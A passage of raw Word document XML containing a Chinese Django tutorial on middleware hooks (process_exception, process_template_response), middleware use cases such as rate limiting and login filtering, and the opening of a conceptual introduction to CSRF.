          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法来处理异常。它的执行顺序也是按照中间件注册顺序的倒序执行。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="764FC6F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process_exception(self, request, exception)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D903FC0"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实例如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51EAA31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318034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1E69F4D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61E3227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HttpResponse("Md1中断")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61AD1B5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48FE039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53DB7EE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26A1659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18C28E9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HttpResponse("hello")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AE44C8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response=callback(request,*callback_args,**callback_kwargs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2358E0E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response</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23B92CE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 process_view..."</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11FB6C3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process_exception(self,request,exception):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="757411F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 process_exception..."</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00E2E8B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Md2(MiddlewareMixin):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C07354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5B93115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"Md2请求"</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="340C752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HttpResponse("Md2中断")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CF7532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173DCDE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"Md2返回"</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3911868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706331A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2873AAA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 process_view..."</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7865C4B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process_exception(self,request,exception):#只有报错了才会执行exception</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7338A5B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 process_exception..."</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F39C2BB"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45F05FC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Md1请求</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3196C84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Md2请求</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="008D4E9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 process_view...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="480CBCB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md2 process_view...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BAF90D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view函数...</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09556D4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Md2返回</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D4E852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p>
    <w:p w14:paraId="3856F7C5" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="000A3629" w:rsidRDefault="00870C85" w:rsidP="00D40693">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="36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流程图如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B6C08CB" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="000A3629" w:rsidRDefault="00870C85" w:rsidP="00D40693">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="36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当</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出现错误时：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A9A57D7"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lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2FD919F3" wp14:editId="36C54E7A">
            <wp:extent cx="6426200" cy="41230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37474" cy="4130288"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E28DC4D"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w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>将</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>md2</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>的</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>process_exception</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>修改如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50983F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process_exception(self,request,exception):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD94BA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 process_exception..."</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A38165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"error"</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34BEDFC1"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199AAD2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5DF19A4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18B9030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 process_view...</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CB58D2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 process_view...</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BF46C0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view函数...</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AE0389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 process_exception...</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66E86EC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7DEE5AF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3C23FEE2"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lastRenderedPageBreak/>
        <w:t>4、process_template_response(self,request,response)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BF5FF70"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该方法对视图函数返回值有要求，必须是一个含有</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>render</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>方法类的对象，才会执行此方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="375555A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Test:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FC321E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w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800080"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>__init__</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(self,status,msg):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BF8BD5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self.status=status</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70856AD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self.msg=msg</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="496043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render(self):</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D00A80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json</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D3AA360" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="00112B23"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dic={</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>'status'</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:self.status,</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>'msg'</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:self.msg}</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D9A98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HttpResponse(json.dumps(dic))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EE2055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index(response):</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FF3B87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Test(True,</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>'测试'</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="064DBA7B" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="000A362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四 中间件应用场景</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EF7BCC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1</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、做</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>IP</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>访问频率限制</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3111EBB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某些</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>IP</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>访问服务器的频率过高，进行拦截，比如限制每分钟不能超过</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>20</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>次。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="178BD792"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2</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>访问过滤</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AD9AF96"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如果用户访问的是</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>login</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>视图（放过）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C320C7F"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如果访问其他视图，需要检测是不是有</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>session</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>认证，已经有了放行，没有返回</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>login</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，这样就省得在多个视图函数上写装饰器了！</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6716397A"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作为延伸扩展内容，有余力的同学可以尝试着读一下以下两个自带的中间件：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AA7F94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800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>'django.contrib.sessions.middleware.SessionMiddleware'</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7911F6B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800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>'django.contrib.auth.middleware.AuthenticationMiddleware'</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AFA03A9" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="000A362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五  CSRF_TOKEN跨站请求伪造</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="446B3F10" w14:textId="77777777" w:rsidR="00870C85" w:rsidRPr="000A3629"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b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>csrf</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>介绍：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="615F2C64"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1、什么是csrf</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B36E188"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Cross-site request forgery</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>）跨站请求伪造，也被称为</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>“One Click Attack”</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>或者</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Session Riding</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，通常缩写为</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或者</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>XSRF</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，是一种对网站的恶意利用。尽管听起来像跨站脚本（</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），但它与</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非常不同，</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利用站点内的信任用户，而</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则通过伪装来自受信任用户的请求来利用受信任的网站。与</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攻击相比，</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攻击往往不大流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比</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更具危险性</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FE69293" w14:textId="77777777" w:rsidR="00D8288D"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可以这样来理解：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2376D2C8" w14:textId="26A55625"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w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。</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如下：其中</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>Web A</w:t>
      </w:r>
      <w:r w:rsidRPr="000A3629">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
